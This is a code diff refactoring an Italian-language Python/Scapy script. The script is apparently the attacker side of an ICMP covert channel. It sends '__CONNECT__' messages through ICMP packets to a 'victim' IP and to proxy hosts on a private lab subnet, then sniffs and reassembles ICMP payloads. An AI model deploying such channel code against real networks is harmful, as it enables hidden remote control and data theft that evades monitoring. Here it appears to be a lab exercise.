@@ -5,27 +5,7 @@ import string
 import argparse
 import mymethods
 import threading
-
-parser = argparse.ArgumentParser()
-parser.add_argument("--ip_vittima",type=str, help="IP della vittima")
-#parser.add_argument("--provaFlag",type=int, help="Comando da eseguire")
-event = threading.Event()
-proxyIP = [
-    "192.168.56.101"
-    ,"192.168.56.103"
-    #,"192.168.56.1"
-    #,"192.168.56.xxx"
-] 
-ip_vittima=None
-sniffed_data=[]
-
-def sanitize(stringa):
-    stringa = ''.join(
-        char if char in string.printable 
-        else'' 
-        for char in stringa
-    ) 
-    return stringa.strip() 
+import comunication_methods as conn  
 
 def analizza_pacchetto(packet):#ex packet_callback 
     if packet.haslayer(IP) and packet.haslayer(ICMP) and packet.haslayer(Raw):
@@ -37,16 +17,20 @@ def analizza_pacchetto(packet):#ex packet_callback
         return {
             "id":id, 
             "seq":seq, 
-            "data":sanitize(packet[Raw].load.decode( 'utf-8',errors='ignore'))}
+            "data":mymethods.sanitize(packet[Raw].load.decode( 'utf-8',errors='ignore'))}
     else:
         print("Packet does not contain ICMP or IP layers.")
-        print(packet.summary()) #Print the packet summary
-        #packet.show() #Print the packet details
+        print(packet.summary()) 
+        #packet.show() 
 
 def packet_callback(packet):
     if packet.haslayer(Raw) and packet.haslayer(IP) and packet.haslayer(ICMP):
         #print(packet.summary())
         sniffed_data.append(packet)
+        return
+    print("Pacchetto non corretto")
+    print(packet.summary()) 
+    #packet.show() 
 
 sniff_args={
     "iface":"Ethernet 2", 
@@ -128,77 +112,74 @@ def unisciDati(dati):
     return payload 
 
 def conn_to_Vittima(ip_vittima):
-    print(f"Connessione stabilita con {ip_vittima}")
-    pkt = IP(dst=ip_vittima)/ICMP() / "".join(
+    print(f"Tentativo di connessione con {ip_vittima}...") 
+    data="".join(
         "__CONNECT__ "+proxyIP[index] if index==0 
         else ", "+proxyIP[index] 
         for index in range(len(proxyIP)
     ))
-    ans = sr1(pkt, timeout=2, verbose=1)
-    if ans:
-        print(f"{ip_vittima} is alive")
-        #ans.show()
-    else:
-        print(f"No reply: {ip_vittima} is not responding") 
-
-packet_received_event = threading.Event()
-
-def sniffer_timeout():
-    global sniffer
-    if not packet_received_event.is_set():
-        print("Timeout: No packet received within 60 seconds")
-        sniffer.stop() 
-        event.set()
+    conn.send_packet(data,ip_vittima) 
 
 def callback_test_connection(packet):
     global timeout_timer
+    print("callback_test_connection")
     print("Packet received: {}".format(packet.summary())) 
     if packet.haslayer(IP) and packet.haslayer(ICMP) and packet.haslayer(Raw): 
         if b'__CONNECT__' in bytes(packet[Raw].load): 
-            packet_received_event.set()
-            timeout_timer.cancel() 
-            event.set()
+            conn.pkt_received_event.set()
+            conn.timeout_timer.cancel()
+            conn.pkt_conn_arrived.set() 
         else:
             print(f"Il paccheto proviene da {packet[IP].src} ma non risponde alla connessione alla macchina") 
 
-def test_connection(ip_dst):
-    global sniffer, timeout_timer
-    if ip_vittima is None:
+def test_connection(ip_dst): 
+    global ip_vittima
+    if type(ip_dst) is not str or re.match(conn.ip_reg_pattern, ip_dst) is None:
+        raise Exception("IP non valido") 
+    if type(ip_vittima) is not str or re.match(conn.ip_reg_pattern, ip_vittima) is None:
         raise Exception("IP della vittima sconosciuto")
     
-    print(f"Connessione con {ip_dst}...")
-    pkt = IP(dst=ip_dst)/ICMP() / "".join( "__CONNECT__ {}".format(ip_vittima))
-    ans = sr1(pkt, timeout=2, verbose=1)
-    if ans:
-        print(f"{ip_dst} is alive")
-        #ans.show()
+    print(f"Tentativo di connessione con {ip_dst}...")
+    data="__CONNECT__ {}".format(ip_vittima)
+    if conn.send_packet(data,ip_dst):  
         try:
-            sniffer= AsyncSniffer(
-                filter=f"icmp and src {ip_dst}" 
-                #,count=1 
-                ,prn=callback_test_connection 
-                #,store=True 
-                ,iface=mymethods.iface_from_IP(ip_dst)[1] 
-            ) 
-            timeout_timer = threading.Timer(10, sniffer_timeout)
-            sniffer.start()  
-            timeout_timer.start()
-            event.wait() 
-            if not sniffer.running: 
-                return False
-            sniffer.stop()
-            sniffer.join()
+            args={
+                "filter":f"icmp and src {ip_dst}" 
+                #,"count":1 
+                ,"prn":conn.proxy_callback #this.callback_test_connection 
+                #,"store":True 
+                ,"iface":mymethods.iface_from_IP(ip_dst)[1]
+            }
+            conn.sniff_packet(args) 
+            conn.pkt_conn_arrived.wait()
+            if conn.sniffer.running: 
+                conn.sniffer.stop()
+                conn.sniffer.join()
             return True
         except Exception as e:
             print(f"test_connection: {e}")
             return False
-    print(f"{ip_dst} is not responding") 
-    return False 
+    return False
+
+def global_variables():
+    global parser, proxyIP, sniffed_data
+
+    parser = argparse.ArgumentParser()
+    parser.add_argument("--ip_vittima",type=str, help="IP della vittima")
+    #parser.add_argument("--provaFlag",type=int, help="Comando da eseguire")
+
+    proxyIP = [
+        "192.168.56.101"
+        ,"192.168.56.103"
+        #,"192.168.56.1"
+        #,"192.168.56.xxx"
+    ]  
+    sniffed_data=[] 
 
 if __name__ == "__main__": 
     #1) l'attaccante si connettte prima con la vittima 
     args=mymethods.check_args(parser)
-    if args.ip_vittima is None:
+    if type(args.ip_vittima) is not str or re.match(conn.ip_reg_pattern, args.ip_vittima) is None:
         print("Devi specificare l'IP della vittima con --ip_vittima")
         mymethods.supported_arguments(parser)
         exit(1) 
